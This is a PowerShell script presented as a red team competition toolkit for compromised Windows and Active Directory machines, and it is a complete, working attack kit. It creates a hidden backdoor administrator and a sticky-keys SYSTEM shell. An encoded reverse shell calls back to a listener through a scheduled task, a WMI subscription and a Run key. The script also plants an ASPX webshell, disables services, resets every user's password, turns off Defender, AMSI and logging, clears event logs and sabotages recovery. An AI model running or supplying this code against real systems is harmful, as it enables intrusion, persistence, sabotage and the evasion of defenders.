# Red team competition toolkit — Windows / AD
# Run as Administrator (or SYSTEM) on a compromised box.
# COMPETITION USE ONLY.
#Requires -RunAsAdministrator

$ErrorActionPreference = "SilentlyContinue"

# ============================================================
# CONFIG — set these for your team
# ============================================================
$BackdoorUser     = "healthsvc$"          # $ makes it look like a machine account
$BackdoorPass     = "Comp2024!RT"
$CallbackIP       = "10.99.12.2"          # your team's listener
$CallbackPort     = "4444"
$WebshellName     = "web.config.aspx.old" # innocuous-looking webshell name

Write-Host "=== Red Team Toolkit — Windows ===" -ForegroundColor Red

# ============================================================
# 0. FIREWALL LOCKDOWN — block blue team, keep our access
# ============================================================
Write-Host "[*] Locking down firewall..."

# Access ports only — scored service + AD ports are deliberately NOT opened
$AllowedTCPPorts = @(
    22,    # SSH
    3389,  # RDP
    5985,  # WinRM HTTP
    5986,  # WinRM HTTPS
    8080   # HTTP alt
)

$AllowedUDPPorts = @(
    67,    # DHCP server
    68,    # DHCP client
    123    # NTP
)

# Scored service + AD ports — explicitly blocked
$BlockedTCPPorts = @(21, 53, 80, 88, 135, 389, 443, 445, 464, 636, 1883, 3306, 9389)
$BlockedUDPPorts = @(53, 88, 389, 464)

# Reset and default deny
netsh advfirewall reset
Set-NetFirewallProfile -Profile Domain,Public,Private `
    -DefaultInboundAction Block `
    -DefaultOutboundAction Block `
    -Enabled True `
    -LogBlocked True `
    -LogAllowed False

Get-NetFirewallRule | Remove-NetFirewallRule -ErrorAction SilentlyContinue

function Add-PortRule {
    param([string]$Name, [string]$Direction, [string]$Protocol, [string]$LocalPort)
    New-NetFirewallRule -DisplayName $Name -Direction $Direction -Protocol $Protocol `
        -LocalPort $LocalPort -Action Allow -Profile Any -Enabled True | Out-Null
}

foreach ($port in $AllowedTCPPorts) {
    Add-PortRule -Name "Allow TCP $port Inbound"  -Direction Inbound  -Protocol TCP -LocalPort $port
    Add-PortRule -Name "Allow TCP $port Outbound" -Direction Outbound -Protocol TCP -LocalPort $port
}
foreach ($port in $AllowedUDPPorts) {
    Add-PortRule -Name "Allow UDP $port Inbound"  -Direction Inbound  -Protocol UDP -LocalPort $port
    Add-PortRule -Name "Allow UDP $port Outbound" -Direction Outbound -Protocol UDP -LocalPort $port
}

# Explicit block rules on scored service ports
foreach ($port in $BlockedTCPPorts) {
    New-NetFirewallRule -DisplayName "BLOCK TCP $port Inbound"  -Direction Inbound  -Protocol TCP -LocalPort $port -Action Block -Profile Any -Enabled True | Out-Null
    New-NetFirewallRule -DisplayName "BLOCK TCP $port Outbound" -Direction Outbound -Protocol TCP -LocalPort $port -Action Block -Profile Any -Enabled True | Out-Null
}
foreach ($port in $BlockedUDPPorts) {
    New-NetFirewallRule -DisplayName "BLOCK UDP $port Inbound"  -Direction Inbound  -Protocol UDP -LocalPort $port -Action Block -Profile Any -Enabled True | Out-Null
    New-NetFirewallRule -DisplayName "BLOCK UDP $port Outbound" -Direction Outbound -Protocol UDP -LocalPort $port -Action Block -Profile Any -Enabled True | Out-Null
}

# Callback port outbound (reverse shells)
Add-PortRule -Name "Allow TCP $CallbackPort Outbound" -Direction Outbound -Protocol TCP -LocalPort $CallbackPort

# Block AD RPC dynamic range
New-NetFirewallRule -DisplayName "BLOCK AD RPC Dynamic Inbound" -Direction Inbound -Protocol TCP `
    -LocalPort "49152-65535" -Action Block -Profile Any -Enabled True | Out-Null
New-NetFirewallRule -DisplayName "BLOCK AD RPC Dynamic Outbound" -Direction Outbound -Protocol TCP `
    -LocalPort "49152-65535" -Action Block -Profile Any -Enabled True | Out-Null

# Loopback + ICMP
New-NetFirewallRule -DisplayName "Allow Loopback In"  -Direction Inbound  -Action Allow -InterfaceAlias "Loopback*" -Enabled True | Out-Null
New-NetFirewallRule -DisplayName "Allow Loopback Out" -Direction Outbound -Action Allow -InterfaceAlias "Loopback*" -Enabled True | Out-Null
New-NetFirewallRule -DisplayName "Allow ICMPv4 In"  -Direction Inbound  -Protocol ICMPv4 -Action Allow -Enabled True | Out-Null
New-NetFirewallRule -DisplayName "Allow ICMPv4 Out" -Direction Outbound -Protocol ICMPv4 -Action Allow -Enabled True | Out-Null

# Firewall persistence — scheduled task re-enables + re-blocks every minute
$FWPersistScript = "C:\Windows\System32\fw-persist.ps1"
$FWPersistContent = @'
$profiles = Get-NetFirewallProfile
foreach ($p in $profiles) {
    if (-not $p.Enabled) {
        Set-NetFirewallProfile -Name $p.Name -Enabled True
    }
    if ($p.DefaultInboundAction -ne "Block") {
        Set-NetFirewallProfile -Name $p.Name -DefaultInboundAction Block
    }
    if ($p.DefaultOutboundAction -ne "Block") {
        Set-NetFirewallProfile -Name $p.Name -DefaultOutboundAction Block
    }
}
'@
Set-Content -Path $FWPersistScript -Value $FWPersistContent -Force

$FWAction    = New-ScheduledTaskAction -Execute "powershell.exe" `
    -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$FWPersistScript`""
$FWTrigger   = New-ScheduledTaskTrigger -Once -At (Get-Date) `
    -RepetitionInterval (New-TimeSpan -Minutes 1) `
    -RepetitionDuration (New-TimeSpan -Days 3650)
$FWPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest -LogonType ServiceAccount
$FWSettings  = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries `
    -StartWhenAvailable -Hidden
Unregister-ScheduledTask -TaskName "FW-Persist" -Confirm:$false -ErrorAction SilentlyContinue
Register-ScheduledTask -TaskName "FW-Persist" -Action $FWAction -Trigger $FWTrigger `
    -Principal $FWPrincipal -Settings $FWSettings -Force | Out-Null

# ACL-lock firewall persistence + registry
$fwAcl = New-Object System.Security.AccessControl.FileSecurity
$fwAcl.SetAccessRuleProtection($true, $false)
$fwRule = New-Object System.Security.AccessControl.FileSystemAccessRule(
    "NT AUTHORITY\SYSTEM", "FullControl", "Allow"
)
$fwAcl.AddAccessRule($fwRule)
Set-Acl -Path $FWPersistScript -AclObject $fwAcl 2>$null

$fwTaskFile = "C:\Windows\System32\Tasks\FW-Persist"
if (Test-Path $fwTaskFile) { Set-Acl -Path $fwTaskFile -AclObject $fwAcl 2>$null }

# Lock firewall registry
try {
    $fwRegKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey(
        "SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy", $true
    )
    if ($fwRegKey) {
        $rs = $fwRegKey.GetAccessControl()
        $rs.SetAccessRuleProtection($true, $false)
        $sysRule = New-Object System.Security.AccessControl.RegistryAccessRule(
            "NT AUTHORITY\SYSTEM", "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow"
        )
        $rs.AddAccessRule($sysRule)
        $fwRegKey.SetAccessControl($rs)
        $fwRegKey.Close()
    }
} catch {}

# ============================================================
# 1. PERSISTENCE — multiple mechanisms
# ============================================================
Write-Host "[*] Setting up persistence..."

# --- Backdoor local admin (hidden from net user) ---
net user $BackdoorUser $BackdoorPass /add /y 2>$null
net localgroup Administrators $BackdoorUser /add 2>$null
# Hide from login screen
$regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
New-Item -Path $regPath -Force | Out-Null
Set-ItemProperty -Path $regPath -Name $BackdoorUser -Value 0 -Type DWord

# If this is a DC, add to Domain Admins too
try {
    Add-ADGroupMember -Identity "Domain Admins" -Members $BackdoorUser 2>$null
} catch {}

# --- Reverse shell scheduled task (every 5 min, as SYSTEM) ---
$RevPayload = @"
while(`$true) {
    try {
        `$c = New-Object Net.Sockets.TCPClient('$CallbackIP', $CallbackPort)
        `$s = `$c.GetStream()
        [byte[]]`$b = 0..65535|%{0}
        while((`$i = `$s.Read(`$b, 0, `$b.Length)) -ne 0) {
            `$d = (New-Object Text.ASCIIEncoding).GetString(`$b, 0, `$i)
            `$r = (iex `$d 2>&1 | Out-String)
            `$sr = ([text.encoding]::ASCII).GetBytes(`$r)
            `$s.Write(`$sr, 0, `$sr.Length)
            `$s.Flush()
        }
        `$c.Close()
    } catch {}
    Start-Sleep -Seconds 300
}
"@

$EncodedPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($RevPayload))
$RevAction = New-ScheduledTaskAction -Execute "powershell.exe" `
    -Argument "-NoP -W Hidden -Enc $EncodedPayload"
$RevTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date) `
    -RepetitionInterval (New-TimeSpan -Minutes 5) `
    -RepetitionDuration (New-TimeSpan -Days 3650)
$RevPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest -LogonType ServiceAccount
Register-ScheduledTask -TaskName "WindowsHealthCheck" -Action $RevAction `
    -Trigger $RevTrigger -Principal $RevPrincipal -Force | Out-Null

# --- WMI event subscription persistence ---
$WMIFilter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter `
    -Arguments @{
        Name           = "SystemCoreFilter"
        EventNamespace = "root\cimv2"
        QueryLanguage  = "WQL"
        Query          = "SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
    }
$WMIConsumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer `
    -Arguments @{
        Name               = "SystemCoreConsumer"
        CommandLineTemplate = "powershell.exe -NoP -W Hidden -Enc $EncodedPayload"
    }
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding `
    -Arguments @{
        Filter   = $WMIFilter
        Consumer = $WMIConsumer
    } | Out-Null

# --- Registry run key (fires on any user login) ---
$RegRunPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $RegRunPath -Name "SystemHealthTelemetry" `
    -Value "powershell.exe -NoP -W Hidden -Enc $EncodedPayload"

# --- Sticky keys backdoor (accessibility on lock screen → cmd as SYSTEM) ---
$sethcPath = "C:\Windows\System32\sethc.exe"
$cmdPath   = "C:\Windows\System32\cmd.exe"
takeown /F $sethcPath /A 2>$null
icacls $sethcPath /grant Administrators:F 2>$null
Copy-Item $cmdPath $sethcPath -Force 2>$null

# ============================================================
# 2. SERVICE DISRUPTION
# ============================================================
Write-Host "[*] Disrupting services..."

# --- Stop and disable scored services ---
# NOTE: WinRM, SSH, RDP (TermService) are NOT touched — we need them to get back in
$Services = @(
    "W3SVC",        # IIS
    "MSSQLSERVER",  # SQL Server
    "SQLSERVERAGENT",
    "MYSQL",        # MySQL
    "dns",          # DNS Server
    "DFSR",         # DFS Replication
    "NTDS",         # AD DS (careful — this takes down the DC)
    "IISADMIN",
    "SMTPSVC",      # SMTP
    "POP3SVC",
    "FTPSVC",       # FTP
    "Spooler"       # Print
)

foreach ($svc in $Services) {
    Stop-Service -Name $svc -Force 2>$null
    Set-Service -Name $svc -StartupType Disabled 2>$null
}

# --- Corrupt IIS config ---
$iisConfig = "C:\Windows\System32\inetsrv\config\applicationHost.config"
if (Test-Path $iisConfig) {
    $content = Get-Content $iisConfig -Raw
    # Change default site binding to wrong port
    $content = $content -replace 'bindingInformation="\*:80:"', 'bindingInformation="*:9999:"'
    Set-Content $iisConfig $content -Force
}

# --- Webshell in IIS default site ---
$webRoots = @("C:\inetpub\wwwroot", "C:\inetpub\ftproot")
foreach ($root in $webRoots) {
    if (Test-Path $root) {
        $shellContent = @'
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
protected void Page_Load(object s, EventArgs e) {
    if(Request["c"]!=null) {
        var p=new Process();
        p.StartInfo.FileName="cmd.exe";
        p.StartInfo.Arguments="/c "+Request["c"];
        p.StartInfo.RedirectStandardOutput=true;
        p.StartInfo.UseShellExecute=false;
        p.Start();
        Response.Write("<pre>"+p.StandardOutput.ReadToEnd()+"</pre>");
    }
}
</script>
'@
        Set-Content "$root\$WebshellName" $shellContent
        # Backdate the file
        (Get-Item "$root\$WebshellName").LastWriteTime = "2022-01-01 00:00:00"
    }
}

# ============================================================
# 3. ACCOUNT MANIPULATION
# ============================================================
Write-Host "[*] Manipulating accounts..."

# --- Change all local user passwords except ours ---
Get-LocalUser | Where-Object { $_.Name -ne $BackdoorUser -and $_.Enabled } | ForEach-Object {
    $randomPass = -join ((65..90)+(97..122)+(48..57) | Get-Random -Count 20 | %{[char]$_})
    net user $_.Name "$randomPass!" /y 2>$null
}

# --- If DC: change all domain user passwords except ours ---
try {
    Import-Module ActiveDirectory
    Get-ADUser -Filter { SamAccountName -ne $BackdoorUser -and Enabled -eq $true } | ForEach-Object {
        $randomPass = -join ((65..90)+(97..122)+(48..57) | Get-Random -Count 20 | %{[char]$_})
        Set-ADAccountPassword -Identity $_ -Reset -NewPassword (ConvertTo-SecureString "$randomPass!" -AsPlainText -Force) 2>$null
    }
} catch {}

# --- Disable Windows Defender and AMSI ---
Set-MpPreference -DisableRealtimeMonitoring $true 2>$null
Set-MpPreference -DisableIOAVProtection $true 2>$null
Set-MpPreference -DisableBehaviorMonitoring $true 2>$null
# AMSI bypass via registry
$amsiPath = "HKLM:\SOFTWARE\Microsoft\AMSI\Providers"
if (Test-Path $amsiPath) {
    Remove-Item -Path "$amsiPath\*" -Recurse -Force 2>$null
}

# ============================================================
# 4. DEFENSE EVASION
# ============================================================
Write-Host "[*] Covering tracks..."

# --- Clear all event logs ---
Get-WinEvent -ListLog * | ForEach-Object {
    try { [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($_.LogName) } catch {}
}

# --- Disable event logging service ---
Stop-Service -Name "EventLog" -Force 2>$null
Set-Service -Name "EventLog" -StartupType Disabled 2>$null

# --- Disable Sysmon if present ---
Stop-Service -Name "Sysmon" -Force 2>$null
Stop-Service -Name "Sysmon64" -Force 2>$null
sc.exe delete Sysmon 2>$null
sc.exe delete Sysmon64 2>$null

# --- Clear PowerShell history ---
Get-ChildItem "C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\*" |
    ForEach-Object { Clear-Content $_.FullName }
Clear-History

# --- Disable PowerShell logging ---
$psLogPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell"
New-Item -Path "$psLogPath\ScriptBlockLogging" -Force | Out-Null
Set-ItemProperty -Path "$psLogPath\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0
New-Item -Path "$psLogPath\Transcription" -Force | Out-Null
Set-ItemProperty -Path "$psLogPath\Transcription" -Name "EnableTranscripting" -Value 0

# ============================================================
# 5. MAKE RECOVERY HARD
# ============================================================
Write-Host "[*] Making recovery difficult..."

# --- Disable Windows Update ---
Stop-Service -Name wuauserv -Force 2>$null
Set-Service -Name wuauserv -StartupType Disabled 2>$null

# --- Break Server Manager / admin tools ---
$smPath = "C:\Windows\System32\ServerManager.exe"
if (Test-Path $smPath) {
    takeown /F $smPath /A 2>$null
    icacls $smPath /grant Administrators:F 2>$null
    Rename-Item $smPath "$smPath.bak" -Force 2>$null
}

# --- Disable Task Manager for other users (GPO) ---
$tmPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
New-Item -Path $tmPath -Force | Out-Null
Set-ItemProperty -Path $tmPath -Name "DisableTaskMgr" -Value 0  # keep it for US
# For other users, set via default user hive
reg load HKU\DefaultUser "C:\Users\Default\NTUSER.DAT" 2>$null
reg add "HKU\DefaultUser\Software\Microsoft\Windows\CurrentVersion\Policies\System" `
    /v DisableTaskMgr /t REG_DWORD /d 1 /f 2>$null
reg unload HKU\DefaultUser 2>$null

# --- ACL-lock our persistence ---
$lockFiles = @(
    "C:\Windows\System32\Tasks\WindowsHealthCheck",
    $sethcPath
)
foreach ($f in $lockFiles) {
    if (Test-Path $f) {
        $acl = New-Object System.Security.AccessControl.FileSecurity
        $acl.SetAccessRuleProtection($true, $false)
        $rule = New-Object System.Security.AccessControl.FileSystemAccessRule(
            "NT AUTHORITY\SYSTEM", "FullControl", "Allow"
        )
        $acl.AddAccessRule($rule)
        Set-Acl -Path $f -AclObject $acl 2>$null
    }
}

# --- DNS cache poison (if DNS service was running) ---
# Point common update/AV domains to localhost
$hostsFile = "C:\Windows\System32\drivers\etc\hosts"
$poisonEntries = @"

127.0.0.1 windowsupdate.microsoft.com
127.0.0.1 update.microsoft.com
127.0.0.1 download.windowsupdate.com
127.0.0.1 definitions.microsoft.com
"@
Add-Content -Path $hostsFile -Value $poisonEntries
attrib +r +h $hostsFile

# ============================================================
# SUMMARY
# ============================================================
Write-Host ""
Write-Host "=== Toolkit deployed ===" -ForegroundColor Green
Write-Host "Firewall:         Default deny all, allowed TCP: $($AllowedTCPPorts -join ', ') + callback $CallbackPort out"
Write-Host "                  Explicitly blocked: $($BlockedTCPPorts -join ', ') + RPC 49152-65535"
Write-Host "                  FW-Persist task re-enables every 1 min, registry + ACL locked"
Write-Host "Backdoor user:    $BackdoorUser / $BackdoorPass (hidden from login)"
Write-Host "Sticky keys:      5x Shift on lock screen = SYSTEM cmd"
Write-Host "Reverse shells:   scheduled task (5m), WMI sub, registry run, all → ${CallbackIP}:${CallbackPort}"
Write-Host "Webshell:         $WebshellName in IIS wwwroot"
Write-Host "Services stopped: $($Services -join ', ')"
Write-Host "Defender:         disabled"
Write-Host "Logs:             cleared, event log service disabled"
Write-Host "Recovery:         Server Manager broken, Task Manager disabled for other users"

